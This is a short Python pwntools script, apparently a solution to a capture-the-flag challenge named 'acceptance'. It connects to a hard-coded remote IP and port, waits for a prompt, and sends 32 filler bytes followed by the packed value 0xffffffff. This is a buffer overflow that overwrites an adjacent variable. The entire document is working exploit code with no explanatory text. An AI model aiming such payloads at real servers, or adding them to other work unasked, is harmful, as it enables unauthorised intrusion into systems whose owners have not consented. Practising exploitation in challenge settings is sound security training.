from pwn import *

p = process('./acceptance')
p = remote('20.169.252.240', 4000)

prints = p.recvuntil(b'Help him: ')

offset = b'A'*32
payload = p32(0xffffffff)
send = offset + payload

p.sendline(offset+payload)

print(p.recvall())
